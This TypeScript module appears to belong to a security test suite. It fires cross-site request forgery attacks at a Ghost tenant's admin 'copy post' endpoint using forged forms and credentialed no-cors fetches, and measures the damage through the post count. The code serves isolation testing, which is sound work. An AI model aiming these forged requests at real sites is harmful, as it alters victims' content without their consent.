// Cross-site request: a reader signed in to tenant A is lured to a page that
// sends A a state-changing request with the reader's own cookie. The target is
// Ghost's "copy this post" action, which takes no body: a form or an
// opaque fetch can send it with no preflight. Four vectors:
//
//  - the attacker's own site, by auto-submitted form and by opaque fetch (cross-site);
//  - tenant B, by a planted form the reader clicks (no script at all) and by a
//    script assumed to be running there (same-site while the shared domain has
//    no list entry, so the reader's SameSite=Lax cookie is sent).
//
// Harm is read from tenant A afterwards: its post count.

import type { BrowserContext } from 'playwright';
import { signedInVictim } from '../browser.ts';
import type { CrossSiteObservation, CrossSiteVector } from '../observations.ts';
import type { World } from '../world.ts';

interface Tap {
  count(): number;
  statuses(): number[];
}

function tap(context: BrowserContext, target: string): Tap {
  let requests = 0;
  const statuses: number[] = [];
  context.on('request', (request) => {
    if (request.url() === target && request.method() === 'POST') requests += 1;
  });
  context.on('response', (response) => {
    if (response.url() === target && response.request().method() === 'POST')
      statuses.push(response.status());
  });
  return { count: () => requests, statuses: () => [...statuses] };
}

export async function attackCrossSite(world: World): Promise<CrossSiteObservation> {
  const target = `${world.a.origin}/ghost/api/admin/posts/${world.planted.victimPostId}/copy/`;
  const postsBefore = await world.a.admin.countPosts();
  const vectors: CrossSiteVector[] = [];

  const run = async (
    name: string,
    origin: CrossSiteVector['origin'],
    drive: (context: BrowserContext) => Promise<void>
  ): Promise<void> => {
    const context = await signedInVictim(
      world.browser,
      world.a.host,
      world.a.admin.session,
      world.a.secure
    );
    try {
      const watcher = tap(context, target);
      await drive(context);
      await new Promise((r) => setTimeout(r, 800));
      vectors.push({
        name,
        origin,
        requestsToVictim: watcher.count(),
        statuses: watcher.statuses(),
      });
    } finally {
      await context.close();
    }
  };

  const goto = async (context: BrowserContext, url: string): Promise<void> => {
    const page = await context.newPage();
    await page.goto(url, { waitUntil: 'load', timeout: 30_000 }).catch(() => undefined);
    await page.waitForTimeout(500);
    await page.close();
  };

  world.evil.aimAt(target);
  await run('forged form from the attacker site', 'cross-site', (c) =>
    goto(c, `${world.evil.origin}/form`)
  );
  await run('forged opaque fetch from the attacker site', 'cross-site', (c) =>
    goto(c, `${world.evil.origin}/fetch`)
  );
  await run('forged form on tenant B, clicked by the reader', 'same-site', async (c) => {
    const page = await c.newPage();
    await page.goto(`${world.b.origin}${world.planted.csrfPostPath}`, {
      waitUntil: 'load',
      timeout: 30_000,
    });
    await page
      .locator('#attack-suite-submit')
      .click({ timeout: 10_000 })
      .catch(() => undefined);
    await page.waitForTimeout(800);
    await page.close();
  });
  await run('forged opaque fetch from a script on tenant B', 'same-site', async (c) => {
    const page = await c.newPage();
    await page.goto(`${world.b.origin}/`, { waitUntil: 'load', timeout: 30_000 });
    // The tenant's own content policy limits where a script on it may connect, so the
    // fetch may be refused in the browser before it is sent: then no request reaches
    // the victim and the vector is recorded as not exercised.
    await page
      .evaluate(
        (url: string) =>
          fetch(url, { method: 'POST', mode: 'no-cors', credentials: 'include' }).then(
            () => undefined
          ),
        target
      )
      .catch(() => undefined);
    await page.close();
  });

  const postsAfter = await world.a.admin.countPosts();
  return { vectors, postsBefore, postsAfter };
}
